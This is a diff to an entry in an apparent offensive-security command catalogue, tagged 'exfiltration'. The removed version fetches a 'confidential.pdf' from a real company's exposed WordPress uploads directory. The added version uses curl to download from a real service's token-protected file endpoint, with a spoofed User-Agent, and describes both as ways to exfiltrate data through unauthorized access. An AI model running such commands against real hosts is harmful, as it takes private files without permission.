@@ -1,9 +1,10 @@
 ---
-id: cmd-curl-download-file
-data: 'curl -O http://www.mtn.co.sz/wp-content/uploads/2020/01/confidential.pdf'
+data: >-
+  curl -o restricted_file.ext
+  "https://app.larksuite.com/file/download?token=VALID_TOKEN_HERE"
 tags:
-  - web
   - download
+  - http-request
   - exfiltration
 type: command
 output: null
@@ -13,7 +14,8 @@ platforms:
   - macOS
   - Windows
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T05:32:10.066Z'
+updated_at: '2025-12-14T17:29:36.588Z'
+id: da01a41b-6e2f-45d3-ab78-fd902513644c
 verified: false
 validated: true
 submitted: true
@@ -23,41 +25,38 @@ submitted: true
 ## Command
 
 ```bash
-curl -O http://www.mtn.co.sz/wp-content/uploads/2020/01/confidential.pdf
+curl -o restricted_file.ext "https://app.larksuite.com/file/download?token=VALID_TOKEN_HERE"
 ```
 
 ## Description
 
-This command downloads a specific file from an exposed web directory using curl's -O option to save it with the original filename. It is ideal for exfiltrating sensitive files discovered via directory listing in information disclosure attacks.
+This command uses curl to download a file from a direct URL, such as a token-protected endpoint in web applications. It is useful for testing unauthorized access or exfiltrating data by bypassing UI restrictions.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-O` | Saves the response with the remote filename | Yes |
-| `URL` | Full path to the target file (e.g., http://target.com/path/to/file.pdf) | Yes |
+| `-o` | Specifies the output file name | Yes |
+| URL argument | The direct download URL with token | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -O http://target.com/wp-content/uploads/file.jpg
+curl -o secret.doc "https://example.com/file?token=abc123"
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -O -L http://target.com/wp-content/uploads/2020/confidential.pdf
+curl -o secret.doc -H "User-Agent: Mozilla/5.0" "https://app.larksuite.com/file/download?token=VALID_TOKEN" --fail
 ```
-
-Follows redirects (-L) for robustness.
 
 ## Expected Output
 
-The file is downloaded to the current directory without errors, confirming unauthorized access (e.g., no 404 or 403 response).
+The command outputs the file contents to the specified file path. On success, no stderr messages; the file size matches the expected document. Errors like 403 indicate permission issues, but in vulnerable cases, it succeeds silently.
 
 ## Related
 
-- [[commands/curl-list-directory]]
-- [[procedures/Access-WordPress-Uploads-Directory-Listing]]
+- [[Related Procedure]]
